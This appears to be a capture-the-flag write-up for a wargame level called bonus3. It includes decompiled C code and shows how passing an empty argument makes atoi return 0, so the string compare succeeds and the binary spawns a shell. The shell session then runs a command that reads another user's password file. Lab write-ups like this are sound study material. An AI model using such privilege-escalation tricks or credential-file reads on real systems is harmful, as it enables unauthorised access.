# Walkthrough

The home of bonus3 contains a binary, `bonus3`, that we decompile using dogbolt.

It contains a `main()` function:
```c
int main(int argc, const char **argv, const char **envp)
{
  char ptr[132];
  FILE *v5; 

  v5 = fopen("/home/user/end/.pass", "r");
  memset(ptr, 0, sizeof(ptr));
  if ( !v5 || argc != 2 )
    return -1;
  fread(ptr, 1, 66, v5); // Reads 1 * 66 bytes on v5, writes on ptr
  ptr[65] = 0;
  ptr[atoi(argv[1])] = 0;
  fread(&ptr[66], 1, 65, v5); // Reads 1 * 65 bytes on v5, writes on ptr + 66
  fclose(v5);
  if ( !strcmp(ptr, argv[1]) )
    execl("/bin/sh", "sh", 0);
  else
    puts(&ptr[66]);
  return 0;
}
```

This level is very easy. `atoi("")` returns 0. Thus, as the program sets the start of ptr as the result of atoi of what's been given as the first argument, and then compares ptr with the first argument. Passing `""` makes `atoi()` return 0, making `ptr` start with `0x00`, making it virtually an empty string. When compared with the first arguement, they match, and we get a shell.
```
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat ~end/.pass
```
